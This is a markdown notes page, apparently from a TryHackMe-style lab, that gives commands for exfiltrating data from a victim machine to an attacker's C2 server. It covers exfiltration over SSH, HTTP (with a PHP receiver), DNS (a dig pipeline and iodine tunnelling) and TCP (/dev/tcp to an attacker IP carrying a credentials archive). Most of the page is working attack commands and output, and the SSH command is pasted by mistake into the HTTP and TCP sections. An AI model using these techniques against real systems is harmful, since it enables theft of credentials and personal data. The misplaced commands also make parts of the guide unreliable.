title: Exfiltration
description:  Commonly used methods of sending data from victim to the attacker's C2 server
---


## Over SSH
```bash
tar cf - task5/ | ssh thm@jump.thm.com "cd /tmp/; tar xpf -"
```
1. We used the tar command the same as the previous task to create an archive file of the task5 directory.
2. Then we passed the archived file over the ssh. SSH clients provide a way to execute a single command without having a full session.
3. We passed the command that must be executed in double quotations, "cd /tmp/; tar xpf. In this case, we change the directory and unarchive the passed file.

If we check the attacker machine, we can see that we have successfully transmitted the file.


## Over HTTP
```bash
tar cf - task5/ | ssh thm@jump.thm.com "cd /tmp/; tar xpf -"
```
To exfiltrate data over the HTTP protocol, we can apply the following steps:
	1. An attacker sets up a web server with a data handler.
	2. A C2 agent or an attacker sends the data. .
	3. The webserver receives the data and stores it. In our case, the contact.php receives the POST request and stores it into /tmp.

The following code snapshot is of PHP code to handle POST requests via a file parameter and stores the received data in the /tmp directory as http.bs64 file name.
```php
<?php
If (isset($_POST['file'])) {
$file=fopen("/tmp/http.bs64","w");
fwrite($file,$_POST['file']);
fclose($file);
}
?>
```

## Over DNS 
```bash
$ cat credit.txt | base64 | tr -d "\n" | fold -w18 | sed 's/.*/&./' | tr -d "\n" | sed s/$/att.tunnel.com/ | awk '{print "dig +short " $1}' | bash
```
- credit.txt to base64: TmFtZTogVEhNLXVzZXIKQWRkcmVzczogMTIzNCBJbnRlcm5ldCwgVEhNCkNyZWRpdCBDYXJkOiAx

### Iodine
A piece of software that lets you tunnel IPv4 data through a DNS server. This can be usable in different situations where internet access is firewalled, but DNS queries are allowed
```bash
$ sudo iodined -f -c -P pass123 10.1.1.1/24 att.tunnel.com 
```
- Ensure to execute the command with sudo. The iodined creates a new network interface (dns0) for the tunneling over the DNS.
- The -f argument is to run the server in the foreground.
- The -c argument is to skip checking the client IP address and port for each DNS request.
- The -P argument is to set a password for authentication.
- The 10.1.1.1/24 argument is to set the network IP for the new network interface (dns0). The IP address of the server will be 10.1.1.1 and the client 10.1.1.2.
att.tunnel.com is the nameserver we previously set.

## Over TCP
The TCP socket technique can be used in a non-secured environment where there are no network-based security products.  This exfiltration type is easy to detect because we rely on non-standard protocols.

```bash
tar cf - task5/ | ssh thm@jump.thm.com "cd /tmp/; tar xpf -"
```

First, we need to prepare a listener on any port you specify. In our case, we choose port 8080.
```bash
$ nc -lvp 8080 > /tmp/task4-creds.data
Listening on [0.0.0.0] (family 0, port 8080)
```
- The nc command will receive data on port 8080. 
- Once we receive the data, we store it in the /tmp/ directory and call it task4-creds.data.

We have a sample file with a couple of credentials on the victim machine.
```bash
$ cat task4/creds.txt
admin:password
Admin:123456
root:toor
```
Exfiltrate the data
```bash
$ tar zcf - task4/ | base64 | dd conv=ebcdic > /dev/tcp/192.168.0.133/8080 
0+1 records in 
0+1 records out 
260 bytes copied, 9.8717e-05 s, 2.6 MB/s
```
1. We used the tar command to create an archive file with the zcf arguments of the content of the secret directory.
2. The z is for using gzip to compress the selected folder, the c is for creating a new archive, and the f is for using an archive file.
3. We then passed the created tar file to the base64 command for converting it to base64 representation.
4. Then, we passed the result of the base64 command to create and copy a backup file with the dd command using EBCDIC encoding data.
5. Finally, we redirect the dd command's output to transfer it using the TCP socket on the specified IP and port, which in this case, port 8080.
```bash
thm@jump-box$ ls -l /tmp/ -rw-r--r-- 1 root root 240 Apr 8 11:37 task4-creds.data
```
On the attaker's machine, we will be using the dd tool to convert it back. 
```bash
$ cd /tmp/
tmp/$ dd conv=ascii if=task4-creds.data |base64 -d > task4-creds.tar
0+1 records in
0+1 records out
260 bytes transferred in 0.000321 secs (810192 bytes/sec)
```
1. We used the dd command to convert the received file to ASCII  representation. We used the task4-creds.data as input to the dd command. 
2. The output of the dd command will be passed to the base64 to decode it using the -d argument.
3. Finally, we save the output in the task4-creds.tar  file.
```bash
$ tar xvf task4-creds.tar 
task4/ 
task4/creds.txt
```
1. We used the tar command to unarchive the file with the xvf arguments.
2. The x is for extracting the tar file, the v for verbosely listing files, and the f is for using an archive file.
```bash
$ cat task4/creds.txt 
admin:password 
Admin:123456 
root:toor
```
